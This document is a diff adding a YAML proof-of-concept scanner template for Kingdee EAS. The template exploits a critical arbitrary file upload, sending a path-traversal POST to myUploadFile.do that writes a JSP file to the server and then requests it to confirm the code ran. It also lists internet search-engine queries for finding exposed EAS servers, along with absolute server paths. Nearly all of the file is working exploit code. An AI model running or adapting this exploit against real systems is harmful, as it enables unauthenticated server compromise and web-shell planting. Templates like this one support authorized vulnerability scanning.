@@ -1,0 +1,55 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Kingdee-EAS"
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+    threatbook-query:
+    cve: 
+    cnvd:
+    tips: /easportal/buffalo/%2e%2e%2f4ndex.jsp   |  绝对路径   /kingdee/eas/server/deploy/eas.ear/cp_web.war/4ndex.jsp |   绝对路径   D:/Kingdee/eas/server/deploy/eas.ear/cp_web.war/4ndex.jsp
+    
+name: poc-yaml-Kingdee-EAS-myUploadFile.do-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /easportal/buffalo/%2e%2e%2fcm/myUploadFile.do
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}    
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"myFile\";filename=\"4ndex.jsp\"\r\nContent-Type: text/html\r\n\r\n<%out.println(\"4ra1n\");%>    \r\n------WebKitFormBoundary{{s2}}--"
+    expression: >-
+      response.status == 200 && response.raw_header.bcontains(b'text/html')
+
+    output:
+      search: |-
+        "(?P<filename>\\w+.jsp)".bsubmatch(response.body)
+      filename: search["filename"]
+      search1: |-
+        "(?P<newpath>ico.*jsp)".bsubmatch(response.body)
+      newpath: search["newpath"]
+
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /easportal/buffalo/%2e%2e%2f4ndex.jsp
+      follow_redirects: false
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1() 
